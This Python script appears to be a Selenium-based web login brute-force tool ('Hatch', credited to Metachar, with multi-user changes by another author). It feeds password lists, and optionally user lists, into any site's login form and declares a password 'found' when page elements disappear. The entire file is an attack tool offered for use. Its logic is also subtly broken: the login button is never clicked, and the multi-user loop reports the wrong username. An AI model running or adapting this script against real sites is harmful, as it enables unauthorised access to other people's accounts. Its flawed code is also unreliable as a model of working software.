# Coded by METACHAR
# Looking to work with other hit me up on my email @metachar1@gmail.com <--
"""
Author: dark-anub1s
Date: 4-19-2021
Features:
    Added multi-user processing
"""
# Imports
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


# Graphics
class Color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    WHITE = '\33[37m'


# Config
parser = OptionParser()
now = datetime.datetime.now()


# Args
parser.add_option("-u", "--username", dest="username", help="Choose the username")
parser.add_option("-U", "--userlist", dest="userlist", help="Choose a list of users")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
(options, args) = parser.parse_args()


def wizard():
    print (banner)
    website = input(Color.GREEN + Color.BOLD + '\n[~] ' + Color.WHITE + 'Enter a website: ')
    sys.stdout.write(Color.GREEN + '[!] '+Color.WHITE + 'Checking if site exists '),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print (Color.GREEN + '[OK]'+Color.WHITE)
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print (Color.RED + '[!]'+Color.WHITE+ 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print (Color.RED + '[X]'+Color.WHITE)
        t.sleep(1)
        print (Color.RED + '[!]'+Color.WHITE+ ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the username selector: ')
    password_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the password selector: ')
    login_btn_selector = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the Login button selector: ')
    username = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter the username to brute-force: ')
    pass_list = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter a directory to a password list: ')
    user_list = input(Color.GREEN + '[~] ' + Color.WHITE + 'Enter a directory to a user list: ')
    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)


def brutes_ulist(userlist, passlist, username_selector, password_selector, login_btn_selector, website):
    with open(passlist, 'r') as f:
        p_list = f.readlines()
    with open(userlist, 'r') as file:
        u_list = file.readlines()
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    browser = webdriver.Chrome(chrome_options=optionss)
    wait = WebDriverWait(browser, 10)
    while True:
        try:
            for user in u_list:
                for line in p_list:
                    browser.get(website)
                    wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                    Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                    Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                    enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                    Sel_user.send_keys(user)
                    Sel_pas.send_keys(line)
                    print ('------------------------')
                    print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ username)
                    print ('------------------------')
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            print('CTRL C')
            break
        except selenium.common.exceptions.NoSuchElementException:
            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print ('LAST PASS ATTEMPT BELLOW')
            print (Color.GREEN + 'Password has been found: {0}'.format(line))
            print (Color.YELLOW + 'Have fun :)')
            exit()


def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
    f = open(pass_list, 'r')
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    browser = webdriver.Chrome(chrome_options=optionss)
    wait = WebDriverWait(browser, 10)
    while True:
        try:
            for line in f:
                browser.get(website)
                wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, login_btn_selector)))
                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                print ('------------------------')
                print (Color.GREEN + 'Tried password: '+Color.RED + line + Color.GREEN + 'for user: '+Color.RED+ username)
                print ('------------------------')
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            print('CTRL C')
            break
        except selenium.common.exceptions.NoSuchElementException:
            print ('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print ('LAST PASS ATTEMPT BELLOW')
            print (Color.GREEN + 'Password has been found: {0}'.format(line))
            print (Color.YELLOW + 'Have fun :)')
            exit()

banner = Color.BOLD + Color.RED +'''
  _    _       _       _
 | |  | |     | |     | |
 | |__| | __ _| |_ ___| |__
 |  __  |/ _` | __/ __| '_ \\
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|
  {0}[{1}-{2}]--> {3}V.1.0
  {4}[{5}-{6}]--> {7}coded by Metachar
  {8}[{9}-{10}]-->{11} brute-force tool                      '''.format(Color.RED, Color.WHITE,Color.RED,Color.GREEN,Color.RED, Color.WHITE,Color.RED,Color.GREEN,Color.RED, Color.WHITE,Color.RED,Color.GREEN)

if not options.username or not options.passlist or not options.userlist:
    wizard()


username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
user_list = options.userlist
print (banner)

if user_list:
    brutes_ulist(user_list, pass_list, username_selector, password_selector, login_btn_selector, website)
else:
    brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)

